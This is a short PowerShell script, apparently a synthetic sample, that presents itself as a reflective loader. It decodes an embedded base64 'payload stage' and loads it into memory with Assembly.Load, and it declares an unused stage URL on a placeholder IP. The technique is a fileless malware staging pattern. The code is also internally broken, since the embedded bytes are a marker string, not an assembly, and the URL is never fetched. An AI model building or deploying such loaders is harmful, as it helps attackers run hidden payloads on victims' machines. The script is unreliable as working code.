<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://203.0.113.10/payload.bin",
    [int]$TimeoutSec = 68
)
$ErrorActionPreference = "Stop"

$StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo5MHRrYXh0bjUx')
Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
$StageResult = [Reflection.Assembly]::Load($StageBytes)
if ($null -ne $StageResult) {
    Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Write-Verbose "stage marker 22 reached"
